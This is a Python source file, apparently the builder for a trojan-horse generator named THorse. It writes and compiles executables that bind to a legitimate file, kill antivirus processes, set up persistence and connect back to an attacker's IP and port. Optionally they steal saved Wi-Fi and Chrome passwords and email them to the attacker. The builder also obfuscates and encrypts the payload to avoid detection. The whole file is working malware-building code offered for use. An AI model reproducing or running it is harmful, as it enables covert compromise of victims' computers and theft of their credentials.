#!/usr/bin/env python3
import encrypt_code
import os
import argparse
import subprocess
import shutil
import banners
import platform
from essential_generators import DocumentGenerator
from colorama import init
from colorama import Fore, Back, Style
init()

if platform.system() == 'Windows':
    PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
    Attacker_System = 'Windows'
elif platform.system() == 'Linux':
    Attacker_System = 'Linux'
    PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"

def get_options():
    parser = argparse.ArgumentParser(description=f'{Fore.RED}THorse v1.7')
    parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10) 
    parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.") 
    parser.add_argument("-k", "--kill_av", dest="kill_av", help="AntivirusKiller : Specify AV's .exe which need to be killed. Ex:- --kill_av cmd.exe") 
    parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]", action='store_true')
    parser.add_argument("-d", "--debug", dest="debug", help=f"Run Virus in Foreground", action='store_true')

    required_arguments = parser.add_argument_group(f'{Fore.RED}Required Arguments{Fore.GREEN}')
    required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")    
    required_arguments.add_argument("--ip", dest="ip", help="Email address to send reports to.")
    required_arguments.add_argument("--port", dest="port", help="Port of the IP Address given in the --ip argument.")
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send \'TrojanHorse Started\' Notification with other Juicy Info.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--output", dest="output", help="Output file name.", required=True)
    return parser.parse_args()

def get_python_pyinstaller_path():
    try:
        if os.name in ('ce', 'nt', 'dos'): 
            # If OS == Windows
            python_path = subprocess.check_output("where pyinstaller.exe", shell=True)

        elif 'posix' in os.name:
            # If OS == Linux
            python_path = subprocess.check_output("which pyinstaller.exe", shell=True)

        python_path = str(python_path).split('\'')[1]
        python_path = python_path.split("\\n")[0]
        python_path = python_path.replace("\\r", "")
        python_path = python_path.replace("\\\\", "/") 
    except Exception:
        python_path = "UnableToFind"

    return python_path

def check_dependencies():
    print(f"{Fore.YELLOW}\n[*] Checking Dependencies...")
    try:
        import mss, essential_generators, PyInstaller, six, cryptography
        print(f"{Fore.GREEN}[+] All Dependencies are Installed on this system ;)\n")
    except Exception as e:
        print(f"[!] Error : {e}")
        try:
            print(f"{Fore.YELLOW}[*] Installing All Dependencies From Scratch...\n")
            print(f'\n{Fore.WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
            import pip
            while 1:
                pip.main(['install', 'mss'])
                pip.main(['install', 'essential_generators'])
                pip.main(['install', 'PyInstaller'])
                pip.main(['install', 'six']) 
                pip.main(['install', 'python-xlib'])
                pip.main(['install', 'cryptography'])
                print(f'\n{Fore.WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
                print(f"{Fore.GREEN}\n[+] Dependencies installed correctly ;)\n")
                break
        except:
            print(f"{Fore.RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")
            quit()

def create_trojan(file_name, email, password, ip, port, time_persistent, legitimate_file=None):    
    with open(file_name, "w+") as file:
        file.write("import payload, win32event, winerror, win32api\n")
        if arguments.stealer:
            file.write("import password_stealer\n") 
        if arguments.bind or arguments.stealer:
            file.write("import threading\n\n")             

        if arguments.bind != None:
            #Codes to Run, Legitimate File on Front End            
            file.write("import subprocess, sys\n\n")        
            file.write("def run_front_file():\n")        
            file.write(f"\tfile_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
            file.write(f"\tsubprocess.call(file_name, shell=True)\n\n")
            
            #Running Front End File on Different Thread
            file.write("t1 = threading.Thread(target=run_front_file)\n")
            file.write("t1.start()\n\n")

        #Below Codes will check for already running instance,
        file.write("\nmutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
        
        if arguments.stealer:
            #Saved Password Stealer 
            file.write("def steal():\n")
            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
            file.write(f"\tsteal.get_wifi_creds()\n")
            file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
            file.write(f"\tsteal.get_chrome_browser_creds()\n")
            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")          
        
        file.write("def check_and_start():\n")
        file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
        file.write("\t\tmutex = None\n")
        file.write("\t\tprint(\"[+] Disabling THorse: Already Running\")\n")

        file.write("\telse:\n")  # if no instance running, going to run THorse
        
        if arguments.stealer:
            file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
            file.write(f"\t\tt2.start()\n\n")                           #Starting Thread        

        file.write(f"\t\ttHorse = payload.MainPayload(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
        if arguments.kill_av != None and arguments.kill_av != "":
            file.write(f"\t\ttHorse.kill_av({arguments.kill_av})\n") 
        else:
            file.write("\t\ttHorse.kill_av()\n")             
        file.write(f"\t\ttHorse.become_persistent({time_persistent})\n") 
        file.write("\t\ttHorse.start()\n\n")     
        file.write("check_and_start()\n")   

def create_trojan_linux(file_name, email, password, ip, port, time_persistent):    
    with open(file_name, "w+") as file:
        file.write("import payload\n")
        
        file.write(f"tHorse = payload.MainPayload(\'{email}\', \'{password}\', \'{ip}\', {port})\n")             
        file.write(f"tHorse.become_persistent({time_persistent})\n") 
        file.write("tHorse.start()\n\n")     
                
        
def obfuscating_payload(file_name):
    gen = DocumentGenerator()
    text = "#" + gen.sentence() 
    with open(file_name, "a") as file:
        file.write(text)
        
def compile_for_windows(file_name):
    if arguments.debug:
        if arguments.bind != None and arguments.stealer:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)                

        elif arguments.bind != None:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)

        elif arguments.stealer:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon}", shell=True)                

        else:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)

    else:
        if arguments.bind != None and arguments.stealer:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)                

        elif arguments.bind != None:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)

        elif arguments.stealer:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon}", shell=True)                

        else:
            subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)

def compile_for_linux(file_name):
    if arguments.debug:
        subprocess.call(f"pyinstaller --onefile --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)
    else:
        subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)
    
def del_junk_file(file_name):
    try:
        if platform.system() == 'Windows':        
            build = os.getcwd() + "\\build"
            file_name = os.getcwd() + f"\\{file_name}"
            pycache = os.getcwd() + "\\__pycache__"
            os.remove(file_name)
            os.remove(file_name + ".spec")    
            shutil.rmtree(build)
            shutil.rmtree(pycache)
        if platform.system() == 'Linux':   
            file_spec = file_name + ".spec"
            os.system(f"rm -r build/ __pycache__/ {file_spec} {file_name}")                    
    except Exception:
        pass
    
def exit_greet():
    try:
        os.system('cls')
    except Exception as e:
        os.system('clear')   
    del_junk_file(arguments.output)
    print(Fore.GREEN + '''Happy Hacking ~THorse!\n''' + Style.RESET_ALL)
    quit()    

if __name__ == '__main__':
    if Attacker_System == 'Windows':
        try:
            shutil.rmtree(os.getcwd() + "\\dist")
        except Exception:
            pass
    else:
        try:
            os.system('rm -Rf dist')
        except Exception:
            pass
        
    try:
        print(banners.get_banner())
        print(f"\t\t{Fore.YELLOW}Author: {Fore.GREEN}Pushpender | {Fore.YELLOW}GitHub: {Fore.GREEN}@PushpenderIndia\n")
          
        arguments = get_options()
        
        if arguments.icon == None:
            arguments.icon = input(f'{Fore.RED}[!] Please Specify Icon Path {Fore.WHITE}[{Fore.GREEN}LEAVE BLANK to SET icon/exe.ico as icon{Fore.WHITE}] : ')
            if arguments.icon == "":
                arguments.icon = "icon/exe.ico"     
            
        if not os.path.exists(PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
            PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()
            if PYTHON_PYINSTALLER_PATH == "UnableToFind":
                print(f'{Fore.RED}[!] Default Pyinstaller Path inside Wine Directory is Incorrect')
                print(f'{Fore.RED}[!] {Fore.WHITE}[Please Update Line 19 Later] [{Fore.RED}DefautPath: {Fore.WHITE}~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe]')
                PYTHON_PYINSTALLER_PATH = "wine "
                PYTHON_PYINSTALLER_PATH += input(f'\n{Fore.WHITE}[?] Enter pyinstaller.exe path manually : ')            
        
        print(f'\n{Fore.GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{Fore.GREEN}')
        print(f'\n   {Fore.YELLOW}Email:{Fore.RED} ' + arguments.email)
        print(f'   {Fore.YELLOW}Password:{Fore.RED} ' + arguments.password) 
        print(f'   {Fore.YELLOW}IP Address:{Fore.RED} ' + arguments.ip)
        print(f'   {Fore.YELLOW}Port:{Fore.RED} ' + arguments.port)         
        print(f'   {Fore.YELLOW}Output Evil File Name:{Fore.RED} ' + arguments.output)
        print(f'   {Fore.YELLOW}Becoming Persistence After:{Fore.RED} ' + str(arguments.time_persistent) + f'{Fore.YELLOW} seconds') 
        print(f'   {Fore.YELLOW}Icon Path:{Fore.RED} ' + arguments.icon)
        print(f'   {Fore.YELLOW}Pyinstaller Path:{Fore.RED} ' + PYTHON_PYINSTALLER_PATH + f" {Fore.YELLOW}[{Fore.WHITE}Manually Update line: 15 & 19, If this PATH is Incorrect{Fore.YELLOW}]")

        if arguments.bind != None:
            print(f'   {Fore.YELLOW}Binding To [{Fore.RED}Legitimate File Path{Fore.YELLOW}]:{Fore.RED} ' + str(arguments.bind))
            
        print(f'\n{Fore.GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
        
        ask = input(f'\n{Fore.WHITE}[?] These info above are correct? (y/n) : ')
    
        if ask.lower() == 'y':
            pass
        else:
            arguments.email = input('\n[?] Type your gmail to receive logs: ')
            arguments.password = input('[?] Type your gmail password: ')
            arguments.ip = input('[?] LHOST or IP Address: ')  
            arguments.port = int(input('[?] LPORT: ')) 
            arguments.time_persistent = int(input('[?] Time After which it should become persistence; [In Seconds]: '))            
            arguments.output = input('[?] Output Evil File Name: ')
            arguments.icon = input(f'[?] Icon Path [{Fore.RED}If Present In This Directory, then just type Name{Fore.WHITE}]: ')  
            if arguments.bind != None:
                arguments.bind = input(f'[?] Path of Legitimate File [{Fore.RED}.exe is Recommended{Fore.WHITE}]: ')            

        check_dependencies()

        print(f"\n{Fore.YELLOW}[*] Generating Please wait for a while...{Fore.MAGENTA}\n")        
        
        if Attacker_System == 'Linux':
            if arguments.linux:
                create_trojan_linux(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port, arguments.time_persistent)
        
        if Attacker_System == 'Windows' and arguments.linux:
            print(f"{Fore.RED}[!] Linux payload can't be compiled from windows machine")
            print(f"{Fore.YELLOW}[*] Making Payload for Windows ...\n")
        
        if arguments.windows:
            create_trojan(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port, arguments.time_persistent, arguments.bind)
        
        obfuscating_payload(arguments.output)
        
        encrypting_code = encrypt_code.Encrypt()
        encrypting_code.encrypt(arguments.output)

        print(f"{Fore.YELLOW}[*] Compiling your payload, Please Wait for a while...")

        print(f"{Fore.MAGENTA}")        

        if arguments.windows:
            compile_for_windows(arguments.output)

        elif arguments.linux:
            compile_for_linux(arguments.output)
            
        else:
            print(f"{Fore.RED}[!] Please Specify {Fore.YELLOW}-w{Fore.RED} for {Fore.GREEN}WINDOWS{Fore.RED} or {Fore.YELLOW}-l{Fore.RED} for {Fore.GREEN}LINUX{Fore.RED} payload generation")            
            
        print(f"\n{Fore.YELLOW}[*] Deleting Junk Files...")
        del_junk_file(arguments.output)
        print(f"{Fore.GREEN}[+] Junk Files Removed Successfully!")
        
        if os.path.exists(f'dist/{arguments.output}.exe') or os.path.exists(f'dist/{arguments.output}'):
            print(f"\n{Fore.GREEN}[+] Generated Successfully!\n")           
            print(f"\n\n{Fore.RED}[***] Don't forget to allow less secure applications in your Gmail account.")
            print(f"{Fore.GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")  
            print(f"\n{Fore.RED} :O-) TIP{Fore.YELLOW} : USE ICONS from {Fore.RED}icon{Fore.YELLOW} folder like this >>  {Fore.RED}--icon icon/exe.ico")            

        else:
            print(f"\n{Fore.RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/thorse\n")  
    
    except KeyboardInterrupt:        
        exit_greet()
 
